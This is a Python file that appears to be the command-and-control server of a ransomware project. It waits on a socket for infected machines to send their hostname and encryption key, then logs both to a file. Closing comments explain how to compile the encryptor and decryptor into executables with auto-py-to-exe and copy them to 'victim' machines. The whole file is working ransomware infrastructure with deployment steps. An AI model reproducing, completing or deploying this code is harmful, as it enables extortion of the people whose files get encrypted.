# The server will sit & wait for someone to launch this ransomware
#
# Once they launch the encryptor, their machine will generate
# a random key
#
# It then sends that key to be stored on the server along 
# with their hostname for identification
import socket


IP_ADDRESS = '192.168.31.138'
PORT = 5678

print('Creating Socket')
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((IP_ADDRESS, PORT))
    print('Listening for connections...')
    s.listen(1)
    conn, addr = s.accept()
    print(f'Connection from {addr} established')
    with conn:
        while True:
            host_and_key = conn.recv(1024).decode()
            with open('encrypted_hosts.txt', 'a') as f:
                f.write(host_and_key+'\n')
            break
        print('Connection completed and closed!')

# Now python -m pip install auto-py-to-exe
# to convert encryption.py => encryption.exe
# to convert decryption.py => decryption.exe
#
# git clone https://github.com/brentvollebregt/auto-py-to-exe.git
# python ./auto-py-to-exe/run.py
# 
# Copy & paste encryption.exe to victim
# Copy & paste decryption.exe to victim

            
